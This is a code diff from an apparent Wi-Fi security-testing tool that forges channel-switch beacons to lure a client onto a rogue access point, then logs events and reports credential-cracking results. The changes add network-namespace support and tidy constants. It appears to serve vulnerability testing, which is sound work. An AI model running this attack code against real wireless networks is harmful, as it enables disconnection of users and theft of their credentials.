@@ -6,6 +6,7 @@
 #include <nlohmann/json.hpp>
 #include <optional>
 #include <thread>
+#include "system/netlink_guards.h"
 
 #include "attacks/components/setup_connections.h"
 #include "ex_program/external_actors/ExternalConn.h"
@@ -66,7 +67,7 @@ static Dot11Beacon patch_ies(const Dot11Beacon &src, const Channel &ap_channel) 
 			vector data(o.data_ptr(), o.data_ptr() + o.data_size());
 			if(!data.empty()) data[0] = static_cast<uint8_t>(ap_channel.ch_num);
 			o = Dot11::option(Dot11::OptionTypes::HT_OPERATION, data.size(), data.data());
-		} else if(id == 192 /* VHT_OPERATION */) {
+		} else if(id == Dot11::OptionTypes::VHT_OP) {
 			vector data(o.data_ptr(), o.data_ptr() + o.data_size());
 			if(data.size() >= 3 && data[0] == 1) // 80 MHz: patch center channel
 				data[1] = vht_center_ch(ap_channel.ch_num);
@@ -89,8 +90,8 @@ static Dot11Beacon patch_ies(const Dot11Beacon &src, const Channel &ap_channel) 
 
 			static_cast<uint8_t>(Dot11::OptionTypes::HT_CAPABILITY),
 			static_cast<uint8_t>(Dot11::OptionTypes::HT_OPERATION),
-			static_cast<uint8_t>(191), // VHT_CAPABILITY
-			static_cast<uint8_t>(192), // VHT_OPERATION
+			static_cast<uint8_t>(Dot11::OptionTypes::VHT_CAP),
+			static_cast<uint8_t>(Dot11::OptionTypes::VHT_OP),
 
 			static_cast<uint8_t>(Dot11::OptionTypes::RSN),
 			static_cast<uint8_t>(Dot11::OptionTypes::EXT_SUPPORTED_RATES),
@@ -163,11 +164,12 @@ RadioTap get_CSA_beacon(const HWAddress<6> &ap_mac, const Channel &ap_channel,
 
 void check_vulnerable(const HWAddress<6> &ap_mac, const HWAddress<6> &sta_mac, const string &iface_name,
 		const string &ssid, const Channel &ap_channel, const Channel &new_channel, const int ms_interval,
-		const int attack_time) {
+		const int attack_time, const optional<string> &netns) {
+	netlink_helper::NetNSContext ns_ctx(netns);
 	PacketSender sender{ iface_name };
 	const auto end_time = steady_clock::now() + seconds(attack_time);
 
-	const unique_ptr<Dot11Beacon> beacon = scan::RSN_scan(iface_name, 20, ap_mac); //TODO hardcoded tscan_timeout
+	const unique_ptr<Dot11Beacon> beacon = scan::RSN_scan(iface_name, 20, ap_mac, nullopt, netns); //TODO hardcoded tscan_timeout
 	if(!beacon) throw run_err("Not found beacon for reproduce");
 	log(LogLevel::INFO,
 			"check_vulnerable called with:\n"
@@ -203,6 +205,7 @@ void run_attack(RunStatus &rs) {
 	const HWAddress<6> ap_mac(rs.get_actor("ap").get(SK::mac));
 	const HWAddress<6> sta_mac(rs.get_actor("client").get(SK::mac));
 	const string iface_name = rs.get_actor("attacker").get(SK::iface);
+	const optional<string> netns = rs.get_actor("attacker")[SK::netns];
 	const string essid = ap.get(SK::ssid);
 	const Channel old_channel = ap->get_channel();
 	const Channel new_channel{
@@ -215,7 +218,7 @@ void run_attack(RunStatus &rs) {
 
 	interruptible_sleep(seconds(att_cfg.at("sleep_before_sec")));
 	rs.process_manager.write_log_all(ATTACK_START_tag);
-	check_vulnerable(ap_mac, sta_mac, iface_name, essid, old_channel, new_channel, ms_interval, attack_time);
+	check_vulnerable(ap_mac, sta_mac, iface_name, essid, old_channel, new_channel, ms_interval, attack_time, netns);
 	rs.process_manager.write_log_all(ATTACK_STOP_tag);
 	interruptible_sleep(seconds(att_cfg.at("sleep_after_sec")));
 
@@ -274,14 +277,12 @@ void stats_attack(const RunStatus &rs) {
 	rs.log_events(elements, { DISCONNECT, CONNECT, TESTER_TAGS });
 	rs.log_events(elements, { { "client", "CTRL-EVENT-STARTED-CHANNEL-SWITCH", "SWITCH", "blue" } });
 
-	pcap_events(rs,
-			elements,
-			{ { "attacker", "wlan.fc.type_subtype == 0x04 && wlan.sa == " + client_mac, "client PROBE", "black" },
-					{ "rogue_ap",
-							"wlan.fc.type_subtype == 0x04 && wlan.sa == " + client_mac,
-							"client PROBE",
-							"red" } });
-
+	pcap_events(rs, elements, {
+		{ "attacker", "wlan.fc.type_subtype == 0x000c && wlan.sa == " + client_mac, "DISCONNECTED (att)", "red" },
+		{ "attacker", "wlan.fc.type_subtype == 0x04 && wlan.sa == " + client_mac, "client PROBE", "black" },
+		{ "rogue_ap", "wlan.fc.type_subtype == 0x04 && wlan.sa == " + client_mac, "client PROBE", "red" }
+	});
+	
 	auto [rogue_ap_connected, crack_result] = visual::helper::hostapd_mana_crack(rs, elements);
 	generate_report(rs, elements, crack_result);
 
